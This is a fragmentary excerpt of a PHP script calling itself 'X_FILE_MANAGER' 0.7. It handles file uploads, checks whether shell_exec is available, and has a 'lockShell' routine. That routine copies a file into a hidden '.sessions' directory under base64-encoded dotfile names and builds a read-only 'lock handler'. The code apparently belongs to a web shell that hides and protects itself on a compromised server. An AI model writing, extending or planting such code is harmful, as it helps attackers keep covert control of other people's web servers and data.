...
define('X_FILE_MANAGER_VERSION', '0.7');
...
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    ...
    if (isset($_POST['upload']) && isset($_FILES['file'])) {
        ...
        for ($i=0; $i<count($files['name']); $i++) {
            ...
            if ($success) { $success_count++; } else { 
                $dbg = ['tmp'=>file_exists($tmp_name)?1:0,'read'=>is_readable($tmp_name)?1:0,'c'=>($c===false)?0:strlen($c),'sh'=>(function_exists('shell_exec')&&is_callable('shell_exec'))?1:0,'w'=>is_writable(dirname($upload_path))?1:0,'t_save'=>isset($tmp_save)&&file_exists($tmp_save)?1:0];
    ...
    if (isset($_POST['lockShell'])) {
        ...
        $sessions  = $TmpNames . '/.sessions';
        $enc_text  = base64_encode($real_fles . '-text-file');
        $enc_hand  = base64_encode($real_fles . '-handler');
        $text_file = $sessions . '/.' . $enc_text;
        $hand_file = $sessions . '/.' . $enc_hand;
        ...
        @shell_exec('cp ' . escapeshellarg($real_fles) . ' ' . escapeshellarg($text_file));
        if (!file_exists($text_file) && file_exists($real_fles)) @file_put_contents($text_file, file_get_contents($real_fles));
        ...
        $handler = get_lock_handler_code($real_fles, $text_file, $cwd, 0444);
